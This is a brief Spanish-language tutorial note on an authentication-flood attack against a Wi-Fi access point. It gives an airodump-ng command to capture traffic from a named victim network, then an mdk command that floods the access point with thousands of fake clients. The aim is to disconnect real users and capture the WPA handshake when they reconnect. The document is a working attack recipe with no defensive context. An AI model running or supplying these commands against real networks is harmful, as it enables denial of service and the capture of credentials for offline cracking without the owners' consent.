# De Auntenticacion con MDK3
Este ataque lo que hace es generar una n cantidad de clientes ser autenticados en el AC victima, de esta manera saturar la red y que los clientes reales se desconecten provocando que se vuelvan a conectar y capturar el handshake.

Empezamos a capturar todo el trafico del AC para llegar a capturar el Handshake

	airodump-ng -c 6 -w CapturasDeAuth-RedBlack --essid Black wlan1mon

- -c 6 *canal del AC*
-  -w Capturas  *nombre del archivo donde se guardara las capturas*
-  --essid Black *nombre del AC*

Una que empezamos a capturar el trafico realizaremos el ataque, esto empezara a generar miles de clientes falsos tratando de autentificarse al AC

	mdk a -a D0:B6:6F:5A:AC:BD 

- a *tipo de ataque*
- -a *direccion mac del AC*
